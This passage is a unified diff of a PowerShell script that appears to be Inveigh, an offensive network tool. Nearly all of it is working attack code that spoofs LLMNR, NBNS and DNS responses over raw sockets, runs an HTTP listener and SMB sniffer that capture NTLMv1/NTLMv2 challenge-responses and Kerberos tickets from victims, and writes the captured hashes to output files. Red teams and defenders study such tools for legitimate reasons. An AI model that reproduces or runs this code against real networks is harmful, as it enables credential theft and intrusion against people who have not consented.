+                        {
+                            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv1 ignored for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[machine account]") > $null    
+                        }
+
                     }
                     else
                     {
-                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv1 challenge/response captured from $session($NTLM_host_string)`:`n$NTLM_domain_string\$NTLM_user_string [not unique]") > $null
-                    }
-
-                    if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv1_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string")))
-                    {
-                        $inveigh.NTLMv1_file_queue.Add($NTLMv1_hash) > $null
-                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] SMB($Port) NTLMv1 challenge/response written to " + "Inveigh-NTLMv1.txt") > $null
-                    }
-
-                    if($inveigh.NTLMv1_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string")
-                    {
-                        $inveigh.NTLMv1_username_list.Add("$SourceIP $NTLM_domain_string\$NTLM_user_string") > $null
-                    }
-
-                    if($inveigh.IP_capture_list -notcontains $SourceIP -and -not $NTLM_user_string.EndsWith('$') -and !$inveigh.spoofer_repeat -and $SourceIP -ne $IP)
-                    {
-                        $inveigh.IP_capture_list.Add($SourceIP) > $null
+                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv1 ignored for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[capture disabled]") > $null    
                     }
 
                 }
                 else
                 {
-                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv1 challenge/response ignored from $session($NTLM_host_string)`:`n$NTLM_domain_string\$NTLM_user_string [machine account]") > $null    
+                    $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] $Protocol($Port) NTLMv1 challenge missing for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort") > $null    
                 }
 
             }
             elseif($NTLM_length -eq 0)
             {
-                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLM null response from $source_IP`:$source_port($NTLM_host_string)") > $null
+                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLM null response from $SourceIP($NTLM_host_string)`:$SourcePort") > $null
             }
 
             Invoke-SessionUpdate $NTLM_domain_string $NTLM_user_string $NTLM_host_string $source_IP
@@ -3513,7 +3575,7 @@ $SMB_functions_scriptblock =
 $HTTP_scriptblock =
 {
     param ($Challenge,$Kerberos,$KerberosCount,$KerberosCredential,$KerberosHash,$KerberosHostHeader,$HTTPAuth,
-    $HTTPBasicRealm,$HTTPContentType,$HTTPIP,$HTTPPort,$HTTPDefaultEXE,$HTTPDefaultFile,$HTTPDir,$HTTPResponse,
+    $HTTPBasicRealm,$HTTPContentType,$HTTPIP,$HTTPPort,$HTTPDefaultEXE,$HTTPDefaultFile,$HTTPDirectory,$HTTPResponse,
     $HTTPS_listener,$IP,$NBNSBruteForcePause,$output_directory,$Proxy,$ProxyIgnore,$proxy_listener,$WPADAuth,
     $WPADAuthIgnore,$WPADResponse)
 
@@ -3556,7 +3618,8 @@ $HTTP_scriptblock =
         {
             $inveigh.HTTP_session_table["$ClientIPAddress`:$ClientPort"] = $HTTP_challenge
         }
-        
+
+        $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLM challenge $HTTP_challenge sent to $HTTP_source_IP`:$HTTP_source_port") > $null
         $hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($inveigh.computer_name)
         $netBIOS_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($inveigh.netBIOS_domain)
         $DNS_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($inveigh.DNS_domain)
@@ -3625,7 +3688,7 @@ $HTTP_scriptblock =
     }
     else
     {
-        $HTTP_endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::any,$HTTPPort)
+        $HTTP_endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,$HTTPPort)
     }
 
     $HTTP_running = $true
@@ -3877,7 +3940,7 @@ $HTTP_scriptblock =
                 }
                 elseif([System.BitConverter]::ToString($HTTP_request_bytes[8..11]) -eq '03-00-00-00')
                 {
-                    Get-NTLMResponse $HTTP_request_bytes $HTTP_source_IP $HTTP_source_port $HTTPPort $HTTP_type
+                    Get-NTLMResponse $HTTP_request_bytes "Y" $HTTP_source_IP $HTTP_source_port $HTTPPort $HTTP_type
                     $HTTP_response_status_code = 0x32,0x30,0x30
                     $HTTP_response_phrase = 0x4f,0x4b
                     $HTTP_client_close = $true
@@ -3886,7 +3949,7 @@ $HTTP_scriptblock =
                     if($proxy_listener)
                     {
                         
-                        if($HTTPResponse -or $HTTPDir)
+                        if($HTTPResponse -or $HTTPDirectory)
                         {
                             $HTTP_header_cache_control = 0x43,0x61,0x63,0x68,0x65,0x2d,0x43,0x6f,0x6e,0x74,0x72,0x6f,0x6c,0x3a,0x20,0x6e,0x6f,0x2d,0x63,0x61,0x63,0x68,0x65,0x2c,0x20,0x6e,0x6f,0x2d,0x73,0x74,0x6f,0x72,0x65
                         }
@@ -3951,21 +4014,21 @@ $HTTP_scriptblock =
             $WPADAuthIgnore.Count -gt 0 -and $WPADAuth -like 'NTLM*' -and ($WPADAuthIgnore | Where-Object {$HTTP_header_user_agent -match $_})) -or $HTTP_client_close)
             {
 
-                if($HTTPDir -and $HTTPDefaultEXE -and $HTTP_request_raw_url -like '*.exe' -and (Test-Path (Join-Path $HTTPDir $HTTPDefaultEXE)) -and !(Test-Path (Join-Path $HTTPDir $HTTP_request_raw_url)))
+                if($HTTPDirectory -and $HTTPDefaultEXE -and $HTTP_request_raw_url -like '*.exe' -and (Test-Path (Join-Path $HTTPDirectory $HTTPDefaultEXE)) -and !(Test-Path (Join-Path $HTTPDirectory $HTTP_request_raw_url)))
                 {
-                    [Byte[]]$HTTP_message_bytes = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDir $HTTPDefaultEXE))
+                    [Byte[]]$HTTP_message_bytes = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDirectory $HTTPDefaultEXE))
                     $HTTP_header_content_type = [System.Text.Encoding]::UTF8.GetBytes("Content-Type: application/exe")
                 }
-                elseif($HTTPDir)
+                elseif($HTTPDirectory)
                 {
 
-                    if($HTTPDefaultFile -and !(Test-Path (Join-Path $HTTPDir $HTTP_request_raw_url)) -and (Test-Path (Join-Path $HTTPDir $HTTPDefaultFile)) -and $HTTP_request_raw_url -notmatch '/wpad.dat')
+                    if($HTTPDefaultFile -and !(Test-Path (Join-Path $HTTPDirectory $HTTP_request_raw_url)) -and (Test-Path (Join-Path $HTTPDirectory $HTTPDefaultFile)) -and $HTTP_request_raw_url -notmatch '/wpad.dat')
                     {
-                        [Byte[]]$HTTP_message_bytes = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDir $HTTPDefaultFile))
+                        [Byte[]]$HTTP_message_bytes = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDirectory $HTTPDefaultFile))
                     }
-                    elseif(($HTTPDefaultFile -and $HTTP_request_raw_url -eq '' -or $HTTPDefaultFile -and $HTTP_request_raw_url -eq '/') -and (Test-Path (Join-Path $HTTPDir $HTTPDefaultFile)))
+                    elseif(($HTTPDefaultFile -and $HTTP_request_raw_url -eq '' -or $HTTPDefaultFile -and $HTTP_request_raw_url -eq '/') -and (Test-Path (Join-Path $HTTPDirectory $HTTPDefaultFile)))
                     {
-                        [Byte[]]$HTTP_message_bytes = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDir $HTTPDefaultFile))
+                        [Byte[]]$HTTP_message_bytes = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDirectory $HTTPDefaultFile))
                     }
                     elseif($WPADResponse -and $HTTP_request_raw_url -match '/wpad.dat')
                     {
@@ -3975,9 +4038,9 @@ $HTTP_scriptblock =
                     else
                     {
 
-                        if(Test-Path (Join-Path $HTTPDir $HTTP_request_raw_url))
+                        if(Test-Path (Join-Path $HTTPDirectory $HTTP_request_raw_url))
                         {
-                            [Byte[]]$HTTP_message_bytes = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDir $HTTP_request_raw_url))
+                            [Byte[]]$HTTP_message_bytes = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDirectory $HTTP_request_raw_url))
                         }
                         else
                         {
@@ -4126,12 +4189,11 @@ $HTTP_scriptblock =
 # Sniffer/Spoofer ScriptBlock - LLMNR/NBNS Spoofer and SMB sniffer
 $sniffer_scriptblock = 
 {
-    param ($DNS,$DNSTTL,$DNS_response_message,$EvadeRG,$IP,$Kerberos,$KerberosCount,$KerberosCredential,$KerberosHash,$LLMNR,
-            $LLMNR_response_message,$LLMNRTTL,$mDNS,$mDNS_response_message,$mDNSTypes,$mDNSTTL,$NBNS,
-            $NBNS_response_message,$NBNSTTL,$NBNSTypes,$output_directory,$Pcap,$PcapPortTCP,$PcapPortUDP,
-            $SMB,$SpooferHostsIgnore,$SpooferHostsReply,$SpooferIP,$SpooferIPsIgnore,$SpooferIPsReply,
-            $SpooferLearning,$SpooferLearningDelay,$SpooferLearningInterval,$SpooferNonprintable,
-            $SpooferThresholdHost,$SpooferThresholdNetwork)
+    param ($DNS,$DNSTTL,$EvadeRG,$Inspect,$IP,$Kerberos,$KerberosCount,$KerberosCredential,$KerberosHash,$LLMNR,
+            $LLMNRTTL,$mDNS,$mDNSTypes,$mDNSTTL,$NBNS,$NBNSTTL,$NBNSTypes,$output_directory,$Pcap,
+            $PcapTCP,$PcapUDP,$SMB,$SpooferHostsIgnore,$SpooferHostsReply,$SpooferIP,
+            $SpooferIPsIgnore,$SpooferIPsReply,$SpooferLearning,$SpooferLearningDelay,$SpooferLearningInterval,
+            $SpooferNonprintable,$SpooferThresholdHost,$SpooferThresholdNetwork)
 
     $sniffer_running = $true
     $byte_in = New-Object System.Byte[] 4	
@@ -4228,8 +4290,8 @@ $sniffer_scriptblock =
 
     while($inveigh.running -and $sniffer_running)
     {
-        $packet_data = $sniffer_socket.Receive($byte_data,0,$byte_data.Length,[System.Net.Sockets.SocketFlags]::None)
-        $memory_stream = New-Object System.IO.MemoryStream($byte_data,0,$packet_data)
+        $packet_length = $sniffer_socket.Receive($byte_data,0,$byte_data.Length,[System.Net.Sockets.SocketFlags]::None)
+        $memory_stream = New-Object System.IO.MemoryStream($byte_data,0,$packet_length)
         $binary_reader = New-Object System.IO.BinaryReader($memory_stream)
         $version_HL = $binary_reader.ReadByte()
         $binary_reader.ReadByte() > $null
@@ -4253,8 +4315,8 @@ $sniffer_scriptblock =
                 $binary_reader.ReadBytes(8) > $null
                 $TCP_header_length = [Int]"0x$(('{0:X}' -f $binary_reader.ReadByte())[0])" * 4
                 $TCP_flags = $binary_reader.ReadByte()
-                $binary_reader.ReadBytes(6) > $null
-                $payload_bytes = $binary_reader.ReadBytes($total_length - ($header_length + $TCP_header_length))
+                $binary_reader.ReadBytes($TCP_header_length - 14) > $null
+                $payload_bytes = $binary_reader.ReadBytes($packet_length)
                 $TCP_flags = ([convert]::ToString($TCP_flags,2)).PadLeft(8,"0")
 
                 if($TCP_flags.SubString(6,1) -eq "1" -and $TCP_flags.SubString(3,1) -eq "0" -and $destination_IP -eq $IP)
@@ -4269,55 +4331,46 @@ $sniffer_scriptblock =
                     139 
                     {
 
-                        if($SMB -eq 'Y')
+                        if($payload_bytes)
                         {
-
-                            if($payload_bytes)
-                            {
-                                Get-SMBConnection $payload_bytes $IP $source_IP $destination_IP $source_port "139"
-                            }
-
-                            if($inveigh.SMB_session_table.ContainsKey("$source_IP`:$source_port"))
-                            {
-                                Get-NTLMResponse $payload_bytes $source_IP $source_port 139 "SMB"
-                            }
-
+                            Get-SMBConnection $payload_bytes $IP $source_IP $destination_IP $source_port "139"
                         }
+
+                        if($inveigh.SMB_session_table.ContainsKey("$source_IP`:$source_port"))
+                        {
+                            Get-NTLMResponse $payload_bytes $SMB $source_IP $source_port 139 "SMB"
+                        }
+
                     }
 
                     445
                     {
 
-                        if($SMB -eq 'Y')
+                        if($kerberos_data.Count -lt $kerberos_length -and "$source_IP`:$source_port" -eq $kerberos_source)
                         {
+                            $kerberos_data += $payload_bytes
 
-                            if($kerberos_data.Count -lt $kerberos_length -and "$source_IP`:$source_port" -eq $kerberos_source)
+                            if($kerberos_data.Count -ge $kerberos_length)
                             {
-                                $kerberos_data += $payload_bytes
-
-                                if($kerberos_data.Count -ge $kerberos_length)
-                                {
-                                    New-KerberosKirbi $kerberos_data $kerberos_base_key "SMB" 445 "$source_IP`:$source_port"
-                                    $kerberos_length = $null
-                                    $kerberos_data = $null
-                                    $kerberos_source = $null
-                                }
-
+                                New-KerberosKirbi $kerberos_data $kerberos_base_key "SMB" 445 "$source_IP`:$source_port"
+                                $kerberos_length = $null
+                                $kerberos_data = $null
+                                $kerberos_source = $null
                             }
 
-                            if($payload_bytes)
-                            {   
-                                $kerberos_connection = Get-SMBConnection $payload_bytes $IP $source_IP $destination_IP $source_port "445"
-                                $kerberos_length = $kerberos_connection[0]
-                                $kerberos_data = $kerberos_connection[1]
-                                $kerberos_source = "$source_IP`:$source_port"
-                            }
+                        }
 
-                            if($inveigh.SMB_session_table.ContainsKey("$source_IP`:$source_port"))
-                            {
-                                Get-NTLMResponse $payload_bytes $source_IP $source_port 445 "SMB"
-                            }
+                        if($payload_bytes)
+                        {   
+                            $kerberos_connection = Get-SMBConnection $payload_bytes $IP $source_IP $destination_IP $source_port "445"
+                            $kerberos_length = $kerberos_connection[0]
+                            $kerberos_data = $kerberos_connection[1]
+                            $kerberos_source = "$source_IP`:$source_port"
+                        }
 
+                        if($inveigh.SMB_session_table.ContainsKey("$source_IP`:$source_port"))
+                        {
+                            Get-NTLMResponse $payload_bytes $SMB $source_IP $source_port 445 "SMB"
                         }
                     
                     }
@@ -4331,21 +4384,25 @@ $sniffer_scriptblock =
                     139 
                     {
 
-                        if($SMB -eq 'Y')
-                        {   
+                        if($payload_bytes)
+                        {
+                            $NTLM_challenge = Get-SMBNTLMChallenge $payload_bytes
+                        }
 
-                            if($payload_bytes)
-                            {
-                                $NTLM_challenge = Get-SMBNTLMChallenge $payload_bytes
-                            }
+                        if($NTLM_challenge -and $destination_IP -ne $source_IP)
+                        {
 
-                            if($NTLM_challenge)
+                            if($source_IP -eq $IP)
                             {
-                                $inveigh.SMB_session_table."$destination_IP`:$destination_port" = $NTLM_challenge
                                 $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB(139) NTLM challenge $NTLM_challenge sent to $destination_IP`:$destination_port") > $null
-                                $NTLM_challenge = $null
+                            }
+                            else
+                            {
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB(139) NTLM challenge $NTLM_challenge received from $destination_IP`:$destination_port") > $null
                             }
 
+                            $inveigh.SMB_session_table."$destination_IP`:$destination_port" = $NTLM_challenge
+                            $NTLM_challenge = $null
                         }
                     
                     }
@@ -4353,34 +4410,39 @@ $sniffer_scriptblock =
                     445
                     {
 
-                        if($SMB -eq 'Y')
-                        {  
-
-                            if($payload_bytes)
-                            {
-                                $NTLM_challenge = Get-SMBNTLMChallenge $payload_bytes
-                            }
-
-                            if($NTLM_challenge -and $destination_IP -ne $source_IP)
-                            {
-                                $inveigh.SMB_session_table."$destination_IP`:$destination_port" = $NTLM_challenge
-                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB(445) NTLM challenge $NTLM_challenge sent to $destination_IP`:$destination_port") > $null
-                                $NTLM_challenge = $null
-                            }
-   
+                        if($payload_bytes)
+                        {
+                            $NTLM_challenge = Get-SMBNTLMChallenge $payload_bytes
                         }
+
+                        if($NTLM_challenge -and $destination_IP -ne $source_IP)
+                        {
+
+                            if($source_IP -eq $IP)
+                            {
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB(445) NTLM challenge $NTLM_challenge sent to $destination_IP`:$destination_port") > $null
+                            }
+                            else
+                            {
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB(445) NTLM challenge $NTLM_challenge received from $destination_IP`:$destination_port") > $null
+                            }
+
+                            $inveigh.SMB_session_table."$destination_IP`:$destination_port" = $NTLM_challenge                      
+                            $NTLM_challenge = $null
+                        }
+                        
                     
                     }
                 
                 }
 
-                if($Pcap -and ($PcapPortTCP -contains $source_port -or $PcapPortTCP -contains $destination_port -or $PcapPortTCP -contains 'All'))
+                if($Pcap -and ($PcapTCP -contains $source_port -or $PcapTCP -contains $destination_port -or $PcapTCP -contains 'All'))
                 {
 
                     if($payload_bytes)
                     {
                         $pcap_epoch_time = ([datetime]::UtcNow)-(Get-Date "1/1/1970")
-                        $pcap_length = [System.BitConverter]::GetBytes($total_length + 14)
+                        $pcap_length = [System.BitConverter]::GetBytes($packet_length + 14)
                         
                         $pcap_packet = [System.BitConverter]::GetBytes([Int][Math]::Truncate($pcap_epoch_time.TotalSeconds)) + 
                             [System.BitConverter]::GetBytes($pcap_epoch_time.Milliseconds) + # should be microseconds but probably doesn't matter
@@ -4388,9 +4450,9 @@ $sniffer_scriptblock =
                             $pcap_length +
                             (,0x00 * 12) +
                             0x08,0x00 +
-                            $byte_data[0..($total_length - 1)]
+                            $byte_data[0..($packet_length - 1)]
 
-                        if($pcap_packet.Count -eq ($total_length + 30))
+                        if($pcap_packet.Count -eq ($packet_length + 30))
                         {
 
                             switch ($Pcap)
@@ -4445,7 +4507,7 @@ $sniffer_scriptblock =
                     {
                         $DNS_query_string = Get-NameQueryString 12 $payload_bytes
                         $DNS_response_data = $payload_bytes[12..($DNS_query_string.Length + 13)]
-                        $UDP_length[0] = $DNS_response_data.Count + $DNS_response_data.Count + $SpooferIP.Length + 27
+                        [Byte[]]$UDP_length = ([System.BitConverter]::GetBytes($DNS_response_data.Count + $DNS_response_data.Count + $SpooferIP.Length + 23))[1,0]
                         $DNS_response_type = "[+]"
 
                         $DNS_response_data += 0x00,0x01,0x00,0x01 +
@@ -4457,36 +4519,27 @@ $sniffer_scriptblock =
         
                         $DNS_response_packet = 0x00,0x35 +
                                                     $source_port[1,0] +
-                                                    $UDP_length[1,0] +
+                                                    $UDP_length +
                                                     0x00,0x00 +
                                                     $payload_bytes[0,1] +
                                                     0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                     $DNS_response_data
 
-                        if($DNS -eq 'Y')
+
+                        $DNS_response_message = Get-SpooferResponseMessage -QueryString $DNS_query_string -Type "DNS" -Enabled $DNS
+                        $DNS_response_type = $DNS_response_message[0]
+                        $DNS_response_message = $DNS_response_message[1]
+
+                        if($DNS_response_message -eq '[response sent]')
                         {
-
-                            if($IP -ne $source_IP)
-                            {
-                                $DNS_send_socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
-                                $DNS_send_socket.SendBufferSize = 1024
-                                $DNS_destination_point = New-Object System.Net.IPEndpoint($source_IP,$endpoint_source_port) 
-                                $DNS_send_socket.SendTo($DNS_response_packet,$DNS_destination_point) > $null
-                                $DNS_send_socket.Close()
-                                $DNS_response_message = "[response sent]"
-                            }
-                            elseif($IP -eq $source_IP)
-                            {
-                                $DNS_response_message = "[local query]"
-                            }
-                            else
-                            {
-                                $DNS_response_message = "[something went wrong]"
-                            }
-
+                            $DNS_send_socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
+                            $DNS_send_socket.SendBufferSize = 1024
+                            $DNS_destination_point = New-Object System.Net.IPEndpoint($source_IP,$endpoint_source_port) 
+                            $DNS_send_socket.SendTo($DNS_response_packet,$DNS_destination_point) > $null
+                            $DNS_send_socket.Close()
                         }
 
-                        if ($destination_IP -eq $IP)
+                        if($destination_IP -eq $IP)
                         {
                             $inveigh.output_queue.Add("$DNS_response_type [$(Get-Date -format s)] DNS request for $DNS_query_string received from $source_IP $DNS_response_message") > $null
                         }
@@ -4523,11 +4576,13 @@ $sniffer_scriptblock =
                     
                                 $NBNS_query_type = [System.BitConverter]::ToString($payload_bytes[43..44])
                                 $NBNS_query_type = Get-NBNSQueryType $NBNS_query_type
+                                $NBNS_type = $payload_bytes[47]
                                 $NBNS_query = [System.BitConverter]::ToString($payload_bytes[13..($payload_bytes.Length - 4)])
                                 $NBNS_query = $NBNS_query -replace "-00",""
                                 $NBNS_query = $NBNS_query.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                 $NBNS_query_string_encoded = New-Object System.String ($NBNS_query,0,$NBNS_query.Length)
-                                $NBNS_query_string_encoded = $NBNS_query_string_encoded.Substring(0,$NBNS_query_string_encoded.IndexOf("CA"))
+                                $NBNS_query_string_encoded_check = $NBNS_query_string_encoded
+                                $NBNS_query_string_encoded = $NBNS_query_string_encoded.Substring(0,$NBNS_query_string_encoded.IndexOf("CA"))                
                                 $NBNS_query_string_subtracted = $null
                                 $NBNS_query_string = $null
                                 $n = 0
@@ -4549,6 +4604,13 @@ $sniffer_scriptblock =
                                 }
                                 until($n -ge ($NBNS_query_string_subtracted.Length) -or $NBNS_query_string.Length -eq 15)
 
+                                if($NBNS_query_string_encoded_check.StartsWith("ABAC") -and $NBNS_query_string_encoded_check.EndsWith("ACAB"))
+                                {
+                                    $NBNS_query_string = $NBNS_query_string.Substring(2)
+                                    $NBNS_query_string = $NBNS_query_string.Substring(0, $NBNS_query_string.Length - 1)
+                                    $NBNS_query_string = "<01><02>" + $NBNS_query_string + "<02>"
+                                }
+
                                 if($NBNS_query_string -notmatch '[^\x00-\x7F]+')
                                 {
 
@@ -4568,90 +4630,81 @@ $sniffer_scriptblock =
                                 $NBNS_request_ignore = $false
                             }
 
-                            if($NBNS -eq 'Y')
+                            if($SpooferLearning -eq 'Y' -and $inveigh.valid_host_list -notcontains $NBNS_query_string -and [System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-01-00-00' -and $source_IP -ne $IP)
                             {
-
-                                if($SpooferLearning -eq 'Y' -and $inveigh.valid_host_list -notcontains $NBNS_query_string -and [System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-01-00-00' -and $source_IP -ne $IP)
+                            
+                                if(($NBNS_learning_log.Exists({param($s) $s -like "20* $NBNS_query_string"})))
                                 {
-                                
-                                    if(($NBNS_learning_log.Exists({param($s) $s -like "20* $NBNS_query_string"})))
+                                    $NBNS_learning_queue_time = [DateTime]$NBNS_learning_log.Find({param($s) $s -like "20* $NBNS_query_string"}).SubString(0,19)
+
+                                    if((Get-Date) -ge $NBNS_learning_queue_time.AddMinutes($SpooferLearningInterval))
                                     {
-                                        $NBNS_learning_queue_time = [DateTime]$NBNS_learning_log.Find({param($s) $s -like "20* $NBNS_query_string"}).SubString(0,19)
-
-                                        if((Get-Date) -ge $NBNS_learning_queue_time.AddMinutes($SpooferLearningInterval))
-                                        {
-                                            $NBNS_learning_log.RemoveAt($NBNS_learning_log.FindIndex({param($s) $s -like "20* $NBNS_query_string"}))
-                                            $NBNS_learning_send = $true
-                                        }
-                                        else
-                                        {
-                                            $NBNS_learning_send = $false
-                                        }
-
-                                    }
-                                    else
-                                    {           
+                                        $NBNS_learning_log.RemoveAt($NBNS_learning_log.FindIndex({param($s) $s -like "20* $NBNS_query_string"}))
                                         $NBNS_learning_send = $true
                                     }
-
-                                    if($NBNS_learning_send)
+                                    else
                                     {
-                                        $NBNS_transaction_ID = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
-                                        $NBNS_transaction_ID_bytes = $NBNS_transaction_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
-                                        $NBNS_transaction_ID = $NBNS_transaction_ID -replace " ","-"
-                                        $NBNS_UDP_client = New-Object System.Net.Sockets.UdpClient 137
-                                        $NBNS_hostname_bytes = $payload_bytes[13..($payload_bytes.Length - 5)]
-
-                                        $NBNS_request_packet = $NBNS_transaction_ID_bytes +
-                                                                0x01,0x10,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x20 +
-                                                                $NBNS_hostname_bytes +
-                                                                0x00,0x20,0x00,0x01
-
-                                        $NBNS_learning_destination_endpoint = New-Object System.Net.IPEndpoint([IPAddress]::broadcast,137)
-                                        $NBNS_UDP_client.Connect($NBNS_learning_destination_endpoint)
-                                        $NBNS_UDP_client.Send($NBNS_request_packet,$NBNS_request_packet.Length)
-                                        $NBNS_UDP_client.Close()
-                                        $NBNS_learning_log.Add("$(Get-Date -format s) $NBNS_transaction_ID $NBNS_query_string") > $null
-                                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] NBNS request $NBNS_query_string sent to " + $NBNS_learning_destination_endpoint.Address.IPAddressToString) > $null
+                                        $NBNS_learning_send = $false
                                     }
 
                                 }
+                                else
+                                {           
+                                    $NBNS_learning_send = $true
+                                }
 
-                                if(($inveigh.valid_host_list -notcontains $NBNS_query_string -or $SpooferHostsReply -contains $NBNS_query_string) -and (!$SpooferHostsReply -or $SpooferHostsReply -contains $NBNS_query_string) -and (
-                                !$SpooferHostsIgnore -or $SpooferHostsIgnore -notcontains $NBNS_query_string) -and (!$SpooferIPsReply -or $SpooferIPsReply -contains $source_IP) -and (
-                                !$SpooferIPsIgnore -or $SpooferIPsIgnore -notcontains $source_IP) -and ($inveigh.spoofer_repeat -or $inveigh.IP_capture_list -notcontains $source_IP.IPAddressToString) -and ($NBNS_query_string.Trim() -ne '*') -and (
-                                $SpooferLearning -eq 'N' -or ($SpooferLearning -eq 'Y' -and !$SpooferLearningDelay) -or ($SpooferLearningDelay -and $spoofer_learning_stopwatch.Elapsed -ge $spoofer_learning_delay)) -and ($source_IP -ne $IP) -and (
-                                $NBNSTypes -contains $NBNS_query_type) -and ($EvadeRG -eq 'Y' -and $destination_IP.IPAddressToString -ne $IP) -and ($SpooferNonprintable -eq 'Y' -or ($SpooferNonprintable -eq 'N' -and $NBNS_query_string -notmatch '[^\x00-\x7F]+')))
+                                if($NBNS_learning_send)
                                 {
+                                    $NBNS_transaction_ID = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
+                                    $NBNS_transaction_ID_bytes = $NBNS_transaction_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+                                    $NBNS_transaction_ID = $NBNS_transaction_ID -replace " ","-"
+                                    $NBNS_UDP_client = New-Object System.Net.Sockets.UdpClient 137
+                                    $NBNS_hostname_bytes = $payload_bytes[13..($payload_bytes.Length - 5)]
 
-                                    if($SpooferLearning -eq 'N' -or !$NBNS_learning_log.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($payload_bytes[0..1]) + " *"}))
-                                    {
-                                        $NBNS_send_socket = New-Object Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
-                                        $NBNS_send_socket.SendBufferSize = 1024
-                                        $NBNS_destination_point = New-Object Net.IPEndpoint($source_IP,$endpoint_source_port)
-                                        $NBNS_send_socket.SendTo($NBNS_response_packet,$NBNS_destination_point) > $null
-                                        $NBNS_send_socket.Close()
-                                        $NBNS_response_message = "[response sent]"
-                                    }
-                                    else
-                                    {
-                                        $NBNS_request_ignore = $true
-                                    }
-                                    
+                                    $NBNS_request_packet = $NBNS_transaction_ID_bytes +
+                                                            0x01,0x10,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x20 +
+                                                            $NBNS_hostname_bytes +
+                                                            0x00,0x20,0x00,0x01
+
+                                    $NBNS_learning_destination_endpoint = New-Object System.Net.IPEndpoint([IPAddress]::broadcast,137)
+                                    $NBNS_UDP_client.Connect($NBNS_learning_destination_endpoint)
+                                    $NBNS_UDP_client.Send($NBNS_request_packet,$NBNS_request_packet.Length)
+                                    $NBNS_UDP_client.Close()
+                                    $NBNS_learning_log.Add("$(Get-Date -format s) $NBNS_transaction_ID $NBNS_query_string") > $null
+                                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] NBNS request $NBNS_query_string sent to " + $NBNS_learning_destination_endpoint.Address.IPAddressToString) > $null
+                                }
+
+                            }
+
+                            $NBNS_response_message = Get-SpooferResponseMessage -QueryString $NBNS_query_string -Type "NBNS" -Enabled $NBNS -NBNSType $NBNS_type
+                            $NBNS_response_type = $NBNS_response_message[0]
+                            $NBNS_response_message = $NBNS_response_message[1]
+
+                            if($NBNS_response_message -eq '[response sent]')
+                            {
+
+                                if($SpooferLearning -eq 'N' -or !$NBNS_learning_log.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($payload_bytes[0..1]) + " *"}))
+                                {
+                                    $NBNS_send_socket = New-Object Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
+                                    $NBNS_send_socket.SendBufferSize = 1024
+                                    $NBNS_destination_point = New-Object Net.IPEndpoint($source_IP,$endpoint_source_port)
+                                    $NBNS_send_socket.SendTo($NBNS_response_packet,$NBNS_destination_point) > $null
+                                    $NBNS_send_socket.Close()
                                 }
                                 else
                                 {
-                                    
-                                    if($source_IP -eq $IP -and $NBNS_learning_log.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($payload_bytes[0..1]) + " *"}))
-                                    {
-                                        $NBNS_request_ignore = $true
-                                    }
-                                   
